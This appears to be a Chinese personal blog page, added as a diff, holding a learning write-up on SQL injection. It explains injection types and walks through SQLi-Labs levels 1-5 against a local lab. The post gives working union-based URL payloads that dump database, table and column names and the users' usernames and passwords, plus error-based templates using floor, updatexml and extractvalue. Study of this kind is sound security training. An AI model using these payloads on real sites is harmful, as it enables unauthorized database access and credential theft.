@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"qnjy.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+
+  <meta name="description" content="这个漏洞以后再写项目的时候必须注意">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入学习">
+<meta property="og:url" content="https://qnjy.github.io/post/6d789c72.html">
+<meta property="og:site_name" content="qnjy&#39;s blog">
+<meta property="og:description" content="这个漏洞以后再写项目的时候必须注意">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHiUhV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHirnJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHiG0s.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHitkq.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHiJ7n.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHidpT.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHi0cF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHiBX4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/11/09/BHirnJ.png">
+<meta property="article:published_time" content="2020-11-07T15:47:02.000Z">
+<meta property="article:modified_time" content="2021-01-18T13:52:07.915Z">
+<meta property="article:author" content="qnjy">
+<meta property="article:tag" content="sqli-labs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center">
+
+
+<link rel="canonical" href="https://qnjy.github.io/post/6d789c72.html">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sql注入学习 | qnjy's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">qnjy's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">方向不对，努力白费</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLI-Labs%E7%AE%80%E4%BB%8B"><span class="nav-text">SQLI-Labs简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-sql%E6%B3%A8%E5%85%A5"><span class="nav-text">1.sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text">2.sql注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">（1）数字型注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">（2）字符型注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-text">（3）搜索型注入点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLI-LABS%E5%AD%A6%E4%B9%A0"><span class="nav-text">SQLI-LABS学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A3%B0%E6%98%8E"><span class="nav-text">声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="nav-text">第一关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="nav-text">第二关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1"><span class="nav-text">第三次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="nav-text">第四关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E5%85%B3"><span class="nav-text">第五关</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="qnjy"
+      src="/images/xigua.jpg">
+  <p class="site-author-name" itemprop="name">qnjy</p>
+  <div class="site-description" itemprop="description">宁静以致远</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/qnjy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;qnjy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:877900490@qq.com" title="E-Mail → mailto:877900490@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </section>
+      </div>
+
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://qnjy.github.io/post/6d789c72.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/xigua.jpg">
+      <meta itemprop="name" content="qnjy">
+      <meta itemprop="description" content="宁静以致远">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qnjy's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-07 23:47:02" itemprop="dateCreated datePublished" datetime="2020-11-07T23:47:02+08:00">2020-11-07</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-01-18 21:52:07" itemprop="dateModified" datetime="2021-01-18T21:52:07+08:00">2021-01-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全知识学习</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>　　这个漏洞以后再写项目的时候必须注意<a id="more"></a></p>
+<h1 id="SQLI-Labs简介"><a href="#SQLI-Labs简介" class="headerlink" title="SQLI-Labs简介"></a>SQLI-Labs简介</h1><h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>　　通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<h2 id="2-sql注入类型"><a href="#2-sql注入类型" class="headerlink" title="2.sql注入类型"></a>2.sql注入类型</h2><p>按照注入点类型来分类</p>
+<h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>sql语句为<code>select * from table_name where id = x</code></p>
+<p>这种类型可以使用and 1=1 和 and 1=2判断：</p>
+<p>​        1.url地址中输入id=x and 1=1页面正常回显</p>
+<p>​        2.url地址中输入id=x and 1=2页面回显不正常，则属于该类型</p>
+<p>原因：</p>
+<p>当输入and 1=1时，执行的sql语句：<code>selece * from table_name where id=x and 1=1</code>，没有逻辑错误，返回正常</p>
+<p>当输入and 1=2时，执行的sql语句：<code>selece * from table_name where id=x and 1=2</code></p>
+<p>如果是字符型注入，则应该是以下情况</p>
+<p>1）<code>selece * from table_name where &#39;id=x and 1=1&#39;</code></p>
+<p>2）<code>selece * from table_name where &#39;id=x and 1=2&#39;</code></p>
+<p>引号里面的被转换为字符串，没有进行逻辑判断，不会出现上述结果，所以这种情况不成立。</p>
+<h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>　　当输入的参数x为字符型时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39;</code></p>
+<p>同样可以用and ‘1’=’1和and ‘1’=’2判断：</p>
+<p>​        1.url地址输入id=x’ and ‘1’=’1页面正常，继续下一步</p>
+<p>​        2.url地址中继续输入id=x’ and ‘1’=’2页面错误，则为字符型注入</p>
+<p>原因：</p>
+<p>当输入id=x’ and ‘1’=’1时，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;1&#39;</code></p>
+<p>语法正确，逻辑正确，所以返回正确</p>
+<p>当输入and ‘1’=’2，执行的sql语句：<code>select * from table_name where id=&#39;x&#39; and &#39;1&#39;=&#39;2&#39;</code></p>
+<p>语法正确，但是逻辑判断错误</p>
+<h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>　　这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like &#39;%关键字%&#39;</code>。</p>
+<p>组合出来的sql注入语句为：<code>select * from news where search like &#39;%测试 %&#39; and &#39;%1%&#39;=&#39;%1%&#39;</code></p>
+<p>测试%’ union select 1,2,3,4 and ‘%’=’</p>
+<p>按照数据提交的方式来分类</p>
+<p>（1）GET 注入</p>
+<p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
+<p>（2）POST 注入</p>
+<p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
+<p>（3）Cookie 注入</p>
+<p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
+<p>（4）HTTP 头部注入</p>
+<p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
+<p>按照执行效果来分类</p>
+<p>（1）基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
+<p>（2）基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>（3）基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>*（4）联合查询注入，可以使用union的情况下的注入。</p>
+<p>*（5）堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<h1 id="SQLI-LABS学习"><a href="#SQLI-LABS学习" class="headerlink" title="SQLI-LABS学习"></a>SQLI-LABS学习</h1><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首先说一下我在学习过程中经常弄混淆的一些单词</p>
+<p>table_schema：数据库名</p>
+<p>information_schema.schemata：所有的数据库中</p>
+<p>information_schema.tables：该数据库中的所有表</p>
+<p>information_schema.column：该表中的所有列</p>
+<p>table_name：表名</p>
+<p>column_name：列名</p>
+<h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>– （这里有一个空格）在sql语句中表示注释，但是在url中，如果在最后一行加上– ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用–+代替，因为+在URL被编码后会变成空格。</p>
+<p>1.输入<code>http://127.0.0.1/sqli/Less-1/?id=1</code>，页面回显正常，所以改地方不是数值查询。<br><img src="https://img-blog.csdnimg.cn/20201027175301124.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>2.在id后面加上’，页面回显不正常，可能存在字符注入<br><img src="https://img-blog.csdnimg.cn/20201027175440385.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>3.输入–+将sql后面的语句注释掉，页面回显正常，说明是单引号字符型注入<br><img src="https://img-blog.csdnimg.cn/20201027175502223.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>4.接着使用order by语句判断该数据库有几列输入，order by 4、order by 5、order by 6···页面都回显错误，只有order by 3正常，说明该表有3列<br><img src="https://img-blog.csdnimg.cn/20201027175622660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>5.将id=1改成id=-1，然后使用union select 1,2,3联合查询语句查询是否有显示位。显示2和3，表明有2个显示位，说明第2列和第3列可以显示信息。<br><img src="https://img-blog.csdnimg.cn/20201027180119978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>6.然后利用sql查询语句爆破出数据库的库名，表名，列名，字段信息：<br>库名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182524974.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>表名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code><br>这里0x7365637572697479是查询的库名security的16进制<br><img src="https://img-blog.csdnimg.cn/20201027182008418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>users表中的列名：<code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code><br><img src="https://img-blog.csdnimg.cn/20201027182640634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>接着使用一下语句查询账号密码<br><code>http://127.0.0.1/sqli/Less-1/?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+ </code><br><img src="https://img-blog.csdnimg.cn/20201027182951559.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FpbmduaWppYXlvdQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>第二关和第一关是一个类型的</p>
+<p>1.输入id=1回显正常</p>
+<p>2.id=1’出错，可以见是单引号闭合出错</p>
+<p>3.之后继续按照第一关的步骤进行爆破信息</p>
+<h2 id="第三次"><a href="#第三次" class="headerlink" title="第三次"></a>第三次</h2><p>1.和之前一样输入</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiUhV.png" alt="BHiUhV.png"></p>
+<p>2.使id=1’–+</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
+<p>但是输入id=1’) –+页面回显正常，说明此处是字符型注入，而且以(‘’)的方式闭合字符串</p>
+<p>3.接着使用order by判断表中有3列数据</p>
+<p>4.使用联合查询union select 1,2,3判断是有回显位，回显位是2,3</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiG0s.png" alt="BHiG0s.png"></p>
+<p>5.爆出库名是security</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHitkq.png" alt="BHitkq.png"></p>
+<p>列出security库中所有的表名</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiJ7n.png" alt="BHiJ7n.png"></p>
+<p>列出users表中所有的列名</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHidpT.png" alt="BHidpT.png"></p>
+<h2 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h2><p>与之前的都类似，先判断这一关是(“”)闭合异常</p>
+<p>1.输入id=1，页面回显正常</p>
+<p>2.输入id=1“–+，页面回显不正常</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHi0cF.png" alt="BHi0cF.png"></p>
+<p>3.进行和第三关一样的步骤</p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>这一关输入id=3时发现页面回显是you are in…</p>
+<p>可见是布尔型注入，它并不能正常显示内容，正确回显只会显示you are in…，错误就不显示，所以无法用order by查看显示位</p>
+<p>1.输入id=1</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHiBX4.png" alt="BHiBX4.png"></p>
+<p>2.输入id=1‘</p>
+<p><img src="https://s1.ax1x.com/2020/11/09/BHirnJ.png" alt="BHirnJ.png"></p>
+<p>页面显示sql语句错误，在这里进行新的注入方式：报错注入</p>
+<p>以下三种常用的语句：</p>
+<p><strong>payload</strong>是我们要输入的sql查询语句</p>
+<p>a.通过floor报错</p>
+<p><code>and (select 1 from (select count(*),concat(( **payload**),floor (rand(0)*2))x from information_schema.tables group by x)a)</code></p>
+<p>其中payload为你要插入的SQL语句</p>
+<p>需要注意的是该语句将 输出字符长度限制为64个字符</p>
+<p>b.通过updatexml报错</p>
+<p>and updatexml(1, <strong>payload</strong>,1)</p>
+<p>同样该语句对输出的字符长度也做了限制，其最长输出32位</p>
+<p>并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</p>
+<p>c.通过ExtractValue报错</p>
+<p>通过ExtractValue报错</p>
+<p>and extractvalue(1, <strong>payload</strong>)</p>
+<p>输出字符有长度限制，最长32位。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="qnjy 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.jpg" alt="qnjy 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli-labs</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
